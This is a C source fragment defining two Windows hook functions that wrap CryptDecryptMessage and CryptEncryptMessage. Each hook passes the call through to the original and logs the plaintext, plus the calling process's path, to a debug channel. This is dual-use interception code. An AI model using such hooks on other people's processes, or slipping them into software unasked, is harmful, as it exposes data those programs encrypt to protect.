BOOL WINAPI MyCryptDecryptMessage(PCRYPT_DECRYPT_MESSAGE_PARA pDecryptPara, const BYTE *pbEncryptedBlob, DWORD cbEncryptedBlob, BYTE *pbDecrypted, DWORD *pcbDecrypted, PCCERT_CONTEXT *ppXchgCert)
{
  BOOL lRetVal = FALSE;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  MYCRYPTDECRYPTMESSAGE fCryptDecryptMessage = (MYCRYPTDECRYPTMESSAGE) CG_CryptDecryptMessage;


  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));


  if (fCryptDecryptMessage)
    lRetVal = fCryptDecryptMessage(pDecryptPara, pbEncryptedBlob, cbEncryptedBlob, pbDecrypted, pcbDecrypted, ppXchgCert);



  if (pcbDecrypted != NULL && pbDecrypted != NULL && *pcbDecrypted > 0)
    stringify(pbDecrypted, *pcbDecrypted, lTemp2, sizeof(lTemp2)/2 - 1);

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyCryptDecryptMessage():CRYPT:%s:%d:%s", gProcShortPath, *pcbDecrypted, lTemp2);
  printDebug(lTemp1, EVENT_CRYPT);

  return(lRetVal);
}




/*
 *
 *
 */

BOOL WINAPI MyCryptEncryptMessage(PCRYPT_ENCRYPT_MESSAGE_PARA pEncryptPara, DWORD cRecipientCert, PCCERT_CONTEXT rgpRecipientCert[], const BYTE *pbToBeEncrypted, DWORD cbToBeEncrypted, BYTE *pbEncryptedBlob, DWORD *pcbEncryptedBlob)
{
  BOOL lRetVal = FALSE;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  MYCRYPTENCRYPTMESSAGE fCryptEncryptMessage = (MYCRYPTENCRYPTMESSAGE) CG_CryptEncryptMessage;


  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));


  if (fCryptEncryptMessage)
    lRetVal = fCryptEncryptMessage(pEncryptPara, cRecipientCert, rgpRecipientCert, pbToBeEncrypted, cbToBeEncrypted, pbEncryptedBlob, pcbEncryptedBlob);



  if (pbToBeEncrypted != NULL && cbToBeEncrypted > 0)
    stringify((void *) pbToBeEncrypted, cbToBeEncrypted, lTemp2, sizeof(lTemp2)/2 - 1);

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyCryptEncryptMessage():CRYPT:%s:%d:%s", gProcShortPath, cbToBeEncrypted, lTemp2);
  printDebug(lTemp1, EVENT_CRYPT);

  return(lRetVal);
}




